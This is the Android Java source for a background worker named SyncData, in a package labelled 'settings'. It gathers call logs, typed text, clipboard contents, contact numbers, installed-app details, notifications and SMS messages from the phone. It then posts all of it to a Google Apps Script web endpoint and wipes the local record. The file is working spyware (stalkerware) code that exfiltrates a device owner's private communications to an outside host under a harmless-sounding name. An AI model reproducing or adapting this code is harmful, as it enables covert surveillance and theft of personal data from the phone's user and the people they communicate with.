package com.example.settings;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import static com.example.settings.MainActivity.clipboardManager;

public class SyncData extends Worker {
    Sharedpref mSharedpref;
    Context context;
    String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime, Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "", NotificationData,SmsData;

    public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        mSharedpref = new Sharedpref(context);
        this.context = context;

    }

    @NonNull
    @Override
    public Result doWork() {
        Name = mSharedpref.getSaveName();
        OutgoingNumbers = mSharedpref.getOutgoingNumbers();
        RecievedNumbers = mSharedpref.getRecievedNumbers();
        MissedCallNumbers = mSharedpref.getMissedCallNumber();
        TextWritten = mSharedpref.getSaveTextWritten();
        NotificationData = mSharedpref.getNotificationData();
        SmsData=mSharedpref.getSmsData();
        try {
            ClipData pData = clipboardManager.getPrimaryClip();
            if (pData != null) {
                ClipData.Item item = pData.getItemAt(0);
                Copiedtext = item.getText().toString();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        int numberlistsize = mSharedpref.getPhoneNumbersLisSize();
        if (mSharedpref.getPrevPhoneNumbersLisSize() < numberlistsize) {
            Phonenumberdetails = mSharedpref.getPhoneNumbers();
            mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
            mSharedpref.commit();
        }
        if (mSharedpref.getPrevPhoneAppdetailsListSize() < mSharedpref.getPhoneAppdetailsListSize()) {
            Phoneappdetails = mSharedpref.getPhoneAppdetails();
            mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
            mSharedpref.commit();
        }
        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        DaysTime = currentDate + "[" + currentTime + "]";
        if (!Name.isEmpty()) {
            if (!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() ||
                    !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty()
                    || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() || !SmsData.isEmpty()) {
                StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbyUGXUk5NbLhbNtHJlt1uBWAIytI4oBUOnPlAB7dc6DPgKiyRBJ/exec",
                        new Response.Listener<String>() {
                            @Override
                            public void onResponse(String response) {
                                mSharedpref.setOutgoingNumbers("");
                                mSharedpref.setRecievedNumbers("");
                                mSharedpref.setMissedCallNumber("");
                                mSharedpref.setSaveTextWritten("");
                                mSharedpref.setNotificationData("");
                                mSharedpref.setSmsData("");
                                mSharedpref.commit();
                            }
                        },
                        new Response.ErrorListener() {
                            @Override
                            public void onErrorResponse(VolleyError error) {
                                Result.retry();
                            }
                        }
                ) {
                    @Override
                    protected Map<String, String> getParams() {
                        Map<String, String> parmas = new HashMap<>();

                        //here we pass params
                        parmas.put("action", "addItem");
                        parmas.put("Name", Name);
                        parmas.put("DaysTime", DaysTime);
                        parmas.put("TextWritten", TextWritten);
                        parmas.put("OutgoingNumbers", OutgoingNumbers);
                        parmas.put("RecievedNumbers", RecievedNumbers);
                        parmas.put("MissedCallNumbers", MissedCallNumbers);
                        parmas.put("Copiedtext", Copiedtext);
                        parmas.put("Phonenumberdetails", Phonenumberdetails);
                        parmas.put("Phoneappdetails", Phoneappdetails);
                        parmas.put("NotificationData", NotificationData);
                        parmas.put("SmsData", SmsData);
                        return parmas;
                    }
                };

                int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
                RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
                stringRequest.setRetryPolicy(retryPolicy);

                RequestQueue queue = Volley.newRequestQueue(context);
                queue.add(stringRequest);
            }
        }
        return Result.success();
    }
}
